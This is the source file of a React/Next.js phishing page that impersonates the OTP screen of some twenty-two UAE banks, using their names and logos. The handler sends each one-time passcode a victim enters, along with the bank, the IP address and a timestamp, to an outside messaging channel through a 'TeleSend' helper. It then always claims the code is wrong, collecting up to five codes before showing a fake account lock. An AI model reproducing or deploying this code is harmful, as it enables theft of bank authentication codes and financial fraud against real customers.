'use client'

import { useRouter, useSearchParams } from 'next/navigation';
import Image from "next/image";
import { useState } from 'react';
import TeleSned from "../../server/TeleSend";

export default function OTPContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const { Send } = TeleSned();
    const [isLoading, setIsLoading] = useState(false);
    const [otpError, setOtpError] = useState('');
    const [attempts, setAttempts] = useState(5);
    const [isLocked, setIsLocked] = useState(false);
    const [message, setMessage] = useState('');
    
    // الحصول على البارامترات من URL
    const bankId = searchParams.get('bankId');
    const bankName = searchParams.get('bankName');
    const ip = searchParams.get('ip');

    const banks = [
        { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif',url:'/payment/banks/bankaz' },
        { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg',url:'/payment/banks/bankaz'},
        { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png',url:'/payment/banks/bankaz' },
        { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg',url:'/payment/banks/bankaz' },
        { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg',url:'/payment/banks/bankaz' },
        { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg',url:'/payment/banks/bankaz' },
        { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png',url:'/payment/banks/bankaz'  },
        { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg',url:'/payment/banks/bankaz'  },
        { id: 9, name: 'HSBC بنك', src: '/bhsbc.png',url:'/payment/banks/bankaz'  },
        { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif',url:'/payment/banks/bankaz' },
        { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif',url:'/payment/banks/bankaz' },
        { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg',url:'/payment/banks/bankaz' },
        { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg',url:'/payment/banks/bankaz' },
        { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg',url:'/payment/banks/bankaz' },
        { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg',url:'/payment/banks/bankaz' },
        { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg',url:'/payment/banks/bankaz' },
        { id: 17, name: 'Wio Bank', src: '/wiob.webp',url:'/payment/bankaz' },
        { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg',url:'/payment/banks/bankaz' },
        { id: 19, name: 'بنك عجمان', src: '/bajman.jpg',url:'/payment/bankaz' },
        { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg',url:'/payment/banks/bankaz' },
        { id: 21, name: 'Liv X', src: '/livexb.jfif',url:'/payment/banks/bankaz' },
        { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg',url:'/payment/banks/bankaz' }
    ];

    const selectedBank = banks[Number(bankId) - 1] || banks[0];

    const handleSubmit = async (e) => {
        e.preventDefault();
        
        if (isLocked) {
            setOtpError('تم حظر الحساب مؤقتاً. يرجى المحاولة لاحقاً.');
            return;
        }

        const form = e.target;
        const otp = form.otp.value;

        if (!/^\d{6}$/.test(otp)) {
            setOtpError('رمز OTP يجب أن يكون 6 أرقام');
            return;
        }

        setIsLoading(true);
        
        try {
            const description = `🔐 **محاولة إدخال OTP**\n\n` +
                               `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
                               `🔑 **رمز OTP المدخل:** ${otp}\n` +
                               `🔄 **المحاولات المتبقية:** ${attempts - 1}\n` +
                               `🌐 **IP المستخدم:** ${ip || 'غير معروف'}\n` +
                               `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
            
            await Send(description);
        } catch (error) {
            console.error('❌ خطأ في الإرسال إلى Discord:', error);
        }

        const newAttempts = attempts - 1;
        setAttempts(newAttempts);

        if (newAttempts === 0) {
            setIsLocked(true);
            setOtpError('❌ تم استنفاذ جميع المحاولات. تم حظر الحساب مؤقتاً.');
            
            try {
                const description = `🚫 **تم حظر الحساب**\n\n` +
                                   `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
                                   `🔑 **آخر رمز OTP:** ${otp}\n` +
                                   `❌ **عدد المحاولات:** 5/5\n` +
                                   `🌐 **IP المستخدم:** ${ip || 'غير معروف'}\n` +
                                   `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
                
                await Send(description);
            } catch (error) {
                console.error('❌ خطأ في الإرسال إلى Discord:', error);
            }
        } else {
            setOtpError(`❌ رمز OTP غير صحيح. تبقى ${newAttempts} محاولات`);
        }

        setIsLoading(false);
    };

    return (
        <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
            <div className="z-10 w-full max-w-md mx-auto">
                <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
                    <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
                        <Image
                            src={selectedBank?.src || '/bank-placeholder.png'}
                            alt={selectedBank?.name || 'البنك المختار'}
                            width={80}
                            height={80}
                            className="object-contain p-2"
                            onError={(e) => {
                                e.target.src = '/bank-placeholder.png';
                            }}
                        />
                    </div>
                    <h2 className="text-2xl font-bold text-[#008000] text-center">
                        {selectedBank?.name || 'البنك المختار'}
                    </h2>
                    <p className="text-gray-600 mt-1 text-center text-sm">
                        {selectedBank?.name || 'البنك المختار'}
                    </p>
                </div>

                <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
                    <h1 className='text-[#008000] text-lg font-bold text-center mb-4'>
                        المصادقة عبر {selectedBank?.name || 'البنك'}
                    </h1>
                    
                    <p className="text-gray-600 text-center text-sm mb-6">
                        تم إرسال رمز OTP إلى هاتفك
                    </p>

                    <div className="text-center mb-4">
                        {!isLocked ? (
                            <p className="text-sm text-gray-500">
                                المحاولات المتبقية: <span className="font-bold text-[#008000]">{attempts}</span>
                            </p>
                        ) : (
                            <p className="text-sm text-red-500 font-bold">
                                🔒 تم حظر الحساب مؤقتاً
                            </p>
                        )}
                    </div>

                    <form onSubmit={handleSubmit} className="space-y-5">
                        <div>
                            <label htmlFor="otp" className="block mb-1.5 text-sm font-semibold text-gray-700 text-right">
                                أدخل رمز OTP <span className="text-[#008000]">*</span>
                            </label>
                            <input
                                type="text"
                                id="otp"
                                name="otp"
                                maxLength={6}
                                required
                                disabled={isLocked}
                                placeholder="_ _ _ _ _ _"
                                onChange={(e) => {
                                    const value = e.target.value.replace(/\D/g, '');
                                    if (value.length <= 6) {
                                        e.target.value = value;
                                        setOtpError('');
                                    }
                                }}
                                className={`w-full border rounded-lg py-3 px-4 text-center text-2xl tracking-[1em] focus:outline-none focus:ring-2 focus:ring-[#008000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                                    otpError ? 'border-red-500' : 'border-gray-300'
                                } ${isLocked ? 'opacity-50 cursor-not-allowed' : ''}`}
                                dir="ltr"
                            />
                            {otpError && (
                                <p className="text-red-500 text-xs mt-1 text-center">{otpError}</p>
                            )}
                            <p className="text-xs text-gray-400 mt-2 text-center">أدخل 6 أرقام</p>
                        </div>

                        <button
                            type="submit"
                            disabled={isLoading || isLocked}
                            className="w-full px-6 py-3 bg-[#008000] text-white rounded-lg shadow-md hover:bg-[#600000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:ring-offset-2 text-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            {isLoading ? (
                                <span className="flex items-center justify-center gap-2">
                                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    جاري المعالجة...
                                </span>
                            ) : (
                                isLocked ? 'محظور' : 'تحقق'
                            )}
                        </button>
                    </form>
                </div>
            </div>
        </main>
    );
    }
